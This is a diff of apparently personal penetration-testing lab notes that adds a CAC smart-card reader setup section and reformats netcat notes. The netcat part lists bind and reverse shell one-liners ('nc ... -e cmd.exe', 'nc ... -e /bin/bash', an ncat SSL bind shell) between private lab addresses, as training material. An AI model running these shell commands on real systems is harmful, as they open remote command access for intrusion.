@@ -1,19 +1,38 @@
-# Setup
+# CAC Reader
 
-Linux           192.168.2.10
-Windows         192.168.2.12
+Notes                 https://help.ubuntu.com/community/CommonAccessCard
 
-# Netcat chat
-Windows         nc -nlvp 4444
-Linux           nc -nv 192.168.2.12 4444
+Packages              apt-get install libpcsclite1 pcscd pcsc-tools
+DoD certificates      dodpki.c3pki.chamb.disa.mil/rootca.html
+CACKey                https://docs.google.com/file/d/0B8JoV2w_9hicRGQ0TFQ5UEpwSkE/edit?pli=1
+
+Attach CAC reader, insert CAC and verify Kali can read it.
+pcsc_scan
+
+Firefox > Edit > Preferences > Advanced > Security Devices > Load
+     Module Name: CAC
+     Browse > /usr/lib64/libcackey.so > Open > OK
+     You should now see your device listed on the left > OK
+
+Firefox extension     www.forge.mil/Resources-Firefox.html
+------------------------------------------------------------------------------------------------------
+
+# Netcat
+
+Linux             192.168.2.10
+Windows           192.168.2.12
+
+# Chat
+Windows           nc -nlvp 4444
+Linux             nc -nv 192.168.2.12 4444
 
 # Bind shell
-Windows         nc -nlvp 4444 -e cmd.exe
-Linux           nc -nv 192.168.2.12 4444
+Windows           nc -nlvp 4444 -e cmd.exe
+Linux             nc -nv 192.168.2.12 4444
 
 # Reverse shell
-Windows         nc -nlvp 4444
-Linux           nc -nv 192.168.2.12 4444 -e /bin/bash
+Windows           nc -nlvp 4444
+Linux             nc -nv 192.168.2.12 4444 -e /bin/bash
 ------------------------------------------------------------------------------------------------------
 
 # Ncat is part of the nmap package.
@@ -21,9 +40,9 @@ Linux           nc -nv 192.168.2.12 4444 -e /bin/bash
 Files needed for Windows 7: ncat.exe, libeay32.dll, ssleay32.dll
 
 # Bind shell
-Windows         ncat -nlvp 4444 -e cmd.exe --allow 192.168.2.10 --ssl
-Linux           ncat -nv 192.168.2.12 4444 --ssl
------------------------------------------------------------------------------------------------
+Windows           ncat -nlvp 4444 -e cmd.exe --allow 192.168.2.10 --ssl
+Linux             ncat -nv 192.168.2.12 4444 --ssl
+------------------------------------------------------------------------------------------------------
 
 # Wireshark
 
@@ -37,4 +56,5 @@ Now generate some traffic with netcat.
 
 Go to Wireshark and hit Stop.
 Right click on any packet > Follow TCP Stream. You should be able to see clear text.
------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------
+
